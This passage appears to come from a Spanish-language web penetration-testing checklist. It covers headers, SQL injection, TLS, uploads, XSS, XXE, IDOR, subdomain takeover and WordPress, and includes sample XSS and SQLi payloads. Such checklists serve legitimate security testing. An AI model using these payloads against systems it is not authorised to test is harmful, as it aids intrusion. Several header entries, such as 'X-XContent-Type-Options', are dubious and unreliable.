- [ ] **Falta cabecera X-Download-Options:** Previene prompts de descarga de archivos, reduciendo riesgo de ataques drive-by download.

- [ ] **Falta cabecera X-Permitted-Cross-Domain-Policies:** Restringe la carga de contenido desde otros dominios.

- [ ] **Falta cabecera X-DNS-Prefetch-Control:** Controla el prefetching de DNS, mejorando privacidad.

- [ ] **Configuración inadecuada de Cache-Control:** Configuraciones de caché inseguras pueden exponer información sensible.

- [ ] **Falta cabecera X-Content-Duration:** Ayuda a prevenir acceso no autorizado a medios especificando la duración.

- [ ] **Falta cabecera Access-Control-Allow-Origin:** Configuración incorrecta puede resultar en intercambio de recursos cruzado no autorizado.

- [ ] **Falta cabecera X-WebKit-CSP:** Cabecera antigua usada por navegadores legacy para CSP.

- [ ] **Falta cabecera X-Content-Security-Policy:** Similar a X-WebKit-CSP, usada por navegadores legacy.

- [ ] **Falta cabecera X-XContent-Type-Options:** Deshabilita sniffing MIME en navegadores antiguos.

- [ ] **Configuración insegura de ETag:** ETag débiles pueden causar problemas de caché y exponer información.

- [ ] **Falta o débil cabecera Content-Encoding:** Configurar correctamente ayuda a proteger contra manipulación de codificación.

- [ ] **Falta o débil cabecera Content-Language:** Protege contra manipulación de idioma de contenido.

- [ ] **Falta o débil cabecera Last-Modified:** Protege contra manipulación de timestamps.

- [ ] **Cabeceras de Cookie inseguras o faltantes:** Configuraciones inseguras pueden llevar a vulnerabilidades.

## SQL Injection

- [ ] **Prueba de comilla simple:** Inyecta una comilla simple ' en campos de entrada y observa si genera un error, indicando posible SQLi.

- [ ] **Tautologías:** Inyecta tautologías como 1=1 o a=a para probar SQLi basado en booleanos.

- [ ] **SQLi basada en UNION:** Usa el operador UNION para combinar resultados y extraer datos de otras tablas.

- [ ] **SQLi basada en Error:** Inyecta sintaxis incorrecta para disparar mensajes de error que revelen estructura de la BD.

- [ ] **SQLi basada en Tiempo:** Inyecta funciones de retardo como SLEEP() o WAITFOR DELAY.

- [ ] **SQLi Out-of-band (OOB):** Prueba SQLi OOB inyectando payloads que causen peticiones externas (DNS, HTTP).

- [ ] **Doble codificación:** Prueba con payloads doblemente codificados para eludir filtros. Ejemplo: %253Cscript%253Ealert(1)%253C%252Fscript%253E.

- [ ] **Usar caracteres de comentario SQL:** Inyecta caracteres de comentario (--, /*, */) para eludir filtros o terminar sentencias.

- [ ] **Manipular lógica de consulta:** Inyecta operadores lógicos como AND u OR para manipular la lógica y eludir controles.

- [ ] **Probar diferentes dialectos SQL:** Usa payloads específicos para MySQL, PostgreSQL, Oracle, MSSQL.

- [ ] **Probar varios métodos HTTP:** Prueba vulnerabilidades SQLi usando POST, PUT, PATCH.

- [ ] **Probar parámetros codificados en base64 o URL:** Intenta eludir validación usando codificación.

- [ ] **Probar varios tipos de contenido:** Prueba SQLi en JSON, XML, form-data.

- [ ] **Manipular cookies:** Inyecta payloads SQL en cookies.

- [ ] **Usar escáneres web:** Usa Burp Suite o OWASP ZAP para identificar SQLi automáticamente.

## Vulnerabilidades TLS

- [ ] **Protocolos SSL/TLS débiles u obsoletos:** Asegura soporte solo para TLS 1.2/1.3, deshabilita SSL 2.0/3.0 y TLS 1.0.

- [ ] **Cipher suites inseguras:** Deshabilita cifrados débiles, usa AES-GCM, ChaCha20-Poly1305, ECDHE.

- [ ] **Vulnerabilidad a ataques conocidos:** Protege contra POODLE, BEAST, CRIME, BREACH, Heartbleed parcheando y siguiendo mejores prácticas.

- [ ] **Gestión inadecuada de certificados:** Usa un certificado válido y confiable de una CA reputable. Revisa expiración y renovación.

- [ ] **Validación insuficiente de cadena de certificados:** Asegura validación correcta para prevenir MITM.

- [ ] **Public key pinning débil o faltante:** Implementa HPKP o logs de transparencia.

- [ ] **Contenido mixto:** Asegura que todo el contenido se sirva sobre HTTPS.

- [ ] **Renegociación insegura:** Deshabilita renegociación iniciada por cliente insegura.

- [ ] **Forward secrecy insuficiente:** Usa cipher suites que soporten forward secrecy (ECDHE, DHE).

- [ ] **Falta de OCSP stapling:** Implementa OCSP stapling para reducir latencia y proveer estado de revocación.

## Subida de Archivos (File Upload)

- [ ] **Límite de tamaño de archivo:** Verifica que existe un límite apropiado para prevenir agotamiento de recursos.

- [ ] **Restricciones de tipo de archivo:** Asegura que solo tipos permitidos puedan subirse, prueba con tipos no permitidos.

- [ ] **Validación de tipo MIME:** Chequea que el tipo MIME sea validado y rechace incorrectos.

- [ ] **Validación de nombre de archivo:** Prueba sanitización para evitar nombres maliciosos (ej. "../", ".htaccess").

- [ ] **Escaneo de malware:** Escanea archivos subidos en busca de virus/malware.

- [ ] **Nombres de archivo duplicados:** Prueba manejo de duplicados para evitar sobrescritura o vulnerabilidades.

- [ ] **Directorio de subida:** Verifica que el directorio sea seguro y no accesible para usuarios no autorizados.

- [ ] **Permisos:** Asegura permisos de archivo/carpeta para prevenir acceso/modificación no autorizada.

- [ ] **Autenticación de usuario:** Prueba si se requiere autenticación para subir archivos.

- [ ] **Validación de imagen:** Prueba vulnerabilidades de procesamiento de imagen (buffer overflows, inyección).

- [ ] **Validación de contenido de archivo:** Asegura que el contenido sea validado contra código malicioso.

- [ ] **Máximas subidas de archivo:** Prueba límites de subidas simultáneas.

- [ ] **Timeouts:** Prueba manejo de subidas largas y timeouts.

- [ ] **Rate limiting:** Verifica limites de tasa para prevenir abuso/DoS.

- [ ] **Manejo de errores:** Prueba manejo de errores para evitar fuga de información.

- [ ] **Cross-site scripting (XSS):** Prueba XSS en metadatos de archivos o nombres.

- [ ] **Path traversal:** Prueba subida con caracteres de traversal ("../").

- [ ] **SQL injection:** Prueba inyección SQL en metadatos o nombres.

- [ ] **Control de acceso:** Verifica controles para ver, editar, borrar archivos.

- [ ] **Monitoreo y logging:** Asegura registro de actividades de subida.

## XSS

- [ ] **Inyección básica de payload:** Inyecta etiquetas script simples o eventos JS. Ej: <script>alert(1)</script>.

- [ ] **Codificación URL:** Usa payloads codificados en URL. Ej: %3Cscript%3Ealert(1)%3C%2Fscript%3E.

- [ ] **Codificación Hex:** Prueba codificación hex para eludir filtros.

- [ ] **Variación de mayúsculas:** Prueba <ScRiPt>alert(1)</ScRiPt>.

- [ ] **Codificación HTML entity:** Inyecta &lt;script&gt;alert(1)&lt;/script&gt;.

- [ ] **Inyección de Null byte:** Usa null bytes para romper restricciones.

- [ ] **Doble codificación:** Prueba doble codificación URL.

- [ ] **Inyección de atributos:** Inyecta payloads cerrando atributos y añadiendo eventos. Ej: "><img src=x onerror=alert(1)>.

- [ ] **Eventos JavaScript:** Inyecta eventos como onmouseover, onfocus, onclick.

- [ ] **Etiquetas malformadas:** Prueba etiquetas malformadas para eludir filtros.

- [ ] **Usar diferentes contextos:** Prueba en comentarios HTML, JS inline, CSS.

- [ ] **Data URI:** Inyecta payloads Data URI.

- [ ] **Payloads SVG:** Usa SVG para ejecutar JS.

- [ ] **Romper contexto JS:** Inyecta payloads que rompan código JS existente.

- [ ] **Probar páginas de error:** Chequea si el input se refleja en errores 404/500.

## XXE

- [ ] **Entidad externa básica:** Inyecta referencia a entidad externa básica.

- [ ] **Entidad de parámetro externa:** Inyecta entidad de parámetro.

- [ ] **Blind XXE (OOB):** Usa técnicas Out-of-Band para exfiltrar datos.

- [ ] **Inclusión de archivos:** Usa SYSTEM identifier para incluir archivos locales/remotos.

- [ ] **Expansión de entidad interna:** Prueba ataque Billion Laughs (DoS).

- [ ] **Referencias recursivas:** Prueba expansión recursiva (DoS).

- [ ] **Bomba XML:** Inyecta archivo XML grande anidado (DoS).

- [ ] **XXE basada en error:** Inyecta XML malformado para revelar info en errores.

- [ ] **Codificación XML:** Prueba diferentes codificaciones (UTF-16, UTF-32).

- [ ] **Usar secciones CDATA:** Inyecta referencias dentro de CDATA.

- [ ] **Entidades personalizadas:** Crea entidades personalizadas con referencias externas.

- [ ] **Probar varios tipos de contenido:** Prueba en SOAP, XHTML, SVG, RSS.

- [ ] **Probar formatos de archivo XML:** Prueba en .docx, .xlsx, .odt.

- [ ] **Probar diferentes métodos HTTP:** Prueba en POST, PUT con payloads XML.

- [ ] **Probar APIs basadas en XML:** Prueba en XML-RPC, SOAP.

## IDOR

- [ ] **IDs secuenciales:** Analiza IDs numéricos secuenciales o predecibles y modifícalos.

- [ ] **Datos específicos de usuario:** Intenta acceder a datos de otro usuario (perfiles, ordenes).

- [ ] **Enumerar identificadores:** Crea múltiples cuentas y compara patrones de IDs.

- [ ] **Probar subida de archivos:** Intenta acceder a archivos subidos adivinando nombres.

- [ ] **Probar endpoints de API:** Analiza y modifica referencias a objetos en APIs.

- [ ] **Probar campos ocultos:** Examina y modifica campos ocultos en formularios.

- [ ] **Probar respuestas JSON/XML:** Analiza referencias a objetos en respuestas.

- [ ] **Probar características relacionadas:** Prueba reset de password, validación de email.

- [ ] **Probar con diferentes roles:** Prueba acceso cruzado entre roles (admin vs user).

- [ ] **Probar con sesiones no autenticadas:** Prueba acceso sin sesión.

- [ ] **Usar escáneres web:** Automatiza detección con Burp/ZAP.

- [ ] **Analizar logs de acceso:** Busca patrones de acceso no autorizado.

- [ ] **Manipular cookies:** Manipula tokens para impersonar usuarios.

- [ ] **Probar métodos de petición:** Prueba IDOR en GET, POST, PUT, DELETE.

- [ ] **Probar parámetros codificados:** Intenta eludir controles con codificación.

## Subdomain Takeover

- [ ] **Enumerar subdominios:** Usa Sublist3r, Amass, dnsrecon.

- [ ] **Analizar registros DNS:** Chequea CNAME, A, MX apuntando a servicios externos/expirados.

- [ ] **Chequear respuestas HTTP:** Busca errores que indiquen servicio no reclamado.

- [ ] **Usar servicios online:** crt.sh, Censys.

- [ ] **Probar servicios de terceros comunes:** AWS S3, GitHub Pages, Heroku, etc.

- [ ] **Probar registros CNAME colgantes:** Busca CNAMEs apuntando a la nada.

- [ ] **Monitorear registro de dominios:** Busca dominios expirados.

- [ ] **Usar herramientas de takeover:** SubOver, Subjack, tko-subs.

- [ ] **Chequear configuraciones DNS erróneas:** Busca misconfiguraciones.

- [ ] **Probar registros DNS wildcard:** Verifica exposición por wildcards.

- [ ] **Chequear subdominios abandonados:** Busca subdominios en desuso.

- [ ] **Probar redirecciones impropias:** Redirecciones a servicios tomables.

- [ ] **Monitorear cambios de propiedad:** Detecta oportunidades de takeover.

- [ ] **Colaborar con proveedores:** Asegura configuración correcta.

- [ ] **Auditar regularmente:** Revisa configuraciones periódicamente.

## Wordpress CMS

- [ ] **Mantener WordPress actualizado:** Actualiza core, plugins y temas.

- [ ] **Probar contraseñas débiles:** Asegura contraseñas fuertes, especialmente admins.

- [ ] **Chequear enumeración de usuarios:** Prueba enumeración vía archivos de autor, deshabilítalo.

- [ ] **Probar usuario admin por defecto:** Asegura que "admin" no exista o esté renombrado.

- [ ] **Limitar intentos de login:** Instala plugins (Wordfence) para prevenir fuerza bruta.

- [ ] **Probar permisos de archivo inseguros:** Verifica permisos de carpetas/archivos.

- [ ] **Probar vulnerabilidades XML-RPC:** Prueba ataques DDoS/Fuerza Bruta en XML-RPC, deshabilítalo si no se usa.

- [ ] **Probar inyección SQL:** Prueba SQLi en inputs/URLs.

- [ ] **Probar XSS:** Prueba inyección JS.

- [ ] **Probar CSRF:** Intenta acciones sin token válido.

- [ ] **Probar plugins vulnerables:** Usa WPScan para detectar plugins con fallos conocidos.

- [ ] **Probar temas vulnerables:** Usa WPScan para temas.

- [ ] **Probar configuraciones inseguras:** Revisa wp-config.php (debug mode, etc).

- [ ] **Chequear mejores prácticas de seguridad:** HTTPS, ocultar listado de directorios, cabeceras seguras.

- [ ] **Usar plugin de seguridad:** Instala Wordfence, Sucuri, etc.
